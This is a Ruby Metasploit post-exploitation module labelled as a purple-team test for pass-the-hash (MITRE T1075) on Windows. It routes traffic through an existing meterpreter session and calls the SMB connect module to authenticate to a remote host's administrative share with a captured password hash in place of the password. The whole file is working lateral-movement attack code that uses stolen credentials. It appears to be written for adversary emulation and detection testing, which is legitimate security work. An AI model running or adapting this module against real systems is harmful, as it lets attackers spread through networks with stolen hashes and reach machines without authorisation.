##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post

  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'Pass the Hash (T1075) Windows - Purple Team',
                      'Description'   => %q{
                        Lateral Movement:
                        Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash. In this technique, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.

                        Windows 7 and higher with KB2871997 require valid domain user credentials or RID 500 administrator hashes.},
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1075' ] ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))

    register_options(
    [
      OptAddress.new('RHOST' , [ true, 'Destination IP address.']),
      OptInt.new('SESSION', [ true, 'The session to run this module on.', 1]),
      OptString.new('SMBDOMAIN', [ true, 'The SMB Domain to use (default to current user).']),
      OptString.new('SMBUSER', [ true, 'The SMB User to use.']),
      OptString.new('SMBHASH', [ true, 'The SMB Hash to use.']),
      OptString.new('SMBSHARE', [ true, 'The share to connect to (C$, ADMIN$, ...)', 'ADMIN$' ])
    ])
  end

  def run_autoroute()
    framework_mod = framework.modules.create('post/multi/manage/autoroute')
    framework_mod.datastore['SESSION'] = datastore['SESSION']
    framework_mod.datastore['VERBOSE'] = datastore['VERBOSE']
    framework_mod.datastore['NETMASK'] = "255.255.255.255"
    framework_mod.datastore['WORKSPACE'] = datastore["WORKSPACE"] if datastore["WORKSPACE"]
    framework_mod.run_simple(
      'LocalInput' => self.user_input,
      'LocalOutput' => self.user_output,
      'Quiet' => false,
      'RunAsJob'  => false)
  end

  def run_smb_share()
    framework_mod = framework.modules.create('auxiliary/admin/smb/smb_connect')
    framework_mod.datastore['RHOST'] = datastore['RHOST']
    framework_mod.datastore['SMBSHARE'] = datastore['SMBSHARE']
    framework_mod.datastore['SMBDOMAIN'] = datastore['SMBDOMAIN']
    framework_mod.datastore['SMBUSER'] = datastore['SMBUSER']
    framework_mod.datastore['SMBPASS'] = datastore['SMBHASH']
    framework_mod.datastore['VERBOSE'] = datastore['VERBOSE']
    framework_mod.datastore['WORKSPACE'] = datastore["WORKSPACE"] if datastore["WORKSPACE"]
    framework_mod.run_simple(
      'LocalInput' => self.user_input,
      'LocalOutput' => self.user_output,
      'Quiet' => false,
      'RunAsJob'  => false)
  end

  def run
    run_autoroute

    begin
      print_status("Executing auxiliary/admin/smb/smb_connect on #{session.inspect}")

      run_smb_share
      print_status("Share successfully connected to!")
      print_good("Module T1075W execution successful.")
    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1075W execution failed.")
    end
  end
end
